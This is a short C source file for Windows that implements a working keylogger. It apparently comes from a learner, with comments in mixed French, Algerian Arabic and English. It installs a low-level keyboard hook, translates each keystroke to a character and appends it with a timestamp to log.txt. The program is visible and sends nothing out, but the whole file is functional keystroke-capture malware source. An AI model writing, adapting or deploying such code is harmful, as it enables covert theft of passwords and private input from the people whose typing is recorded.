#include <stdio.h>
#include <windows.h>


HHOOK g_hook;      // idf de hook 
FILE *g_log;       // pointeur de fichers log

// Windows calls THIS function every time a key is pressed or released rahi call backfunction ncode pour verification , wparam howa type tae event  wmkeyboard w lparam adress de hook 
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        // on click kbd pointer ypwanti 3la lparam ywli ando access l gae info tae hook 
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)lParam;
        UINT keyCode = kbd->vkCode;
        UINT scanCode = kbd->scanCode;
        BYTE buff[256];  // array of 256 case of type byte qui contenir tout les caracter de clavier 
        PBYTE lpKeyState = buff;     // pointer for array buffer 
        GetKeyboardState(lpKeyState); // now this funcition fill the table of buffer with keyboard state via pointer 
        WCHAR pwszBuff[2];  // buffer type wchar contain the current key the output of to unicode fucntion 
        SYSTEMTIME time;
        LPSYSTEMTIME lpSystemTime = &time;
        GetLocalTime(lpSystemTime);     
        int result = ToUnicode(keyCode, scanCode, lpKeyState, pwszBuff ,2 ,0); // to transfer key code to key name 
        
        fprintf(g_log, " %02u:%02u:%02u.%03u ",
           lpSystemTime->wHour,
           lpSystemTime->wMinute,
           lpSystemTime->wSecond,
           lpSystemTime->wMilliseconds);
        fprintf(g_log, "Key pressed: %c\n", pwszBuff[0]);     // ykteb code tae character f log.txt
        fflush(g_log);   // write to file immediately
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

int main()
{
    g_log = fopen("log.txt", "a");
    if (!g_log) { printf("Cannot open log file\n"); return 1; }
                                //hook type, function , null for executing it om our programme not externel dll
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);   //assigning this fucntion keyboardproc to windwos hook everytime hook happens windwos call this function 
    if (!g_hook) { printf("Hook failed\n"); return 1; }

    printf("Keylogger running... type something! (Close window to stop)\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {   // keeps hook alive
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    fclose(g_log);
    return 0;
}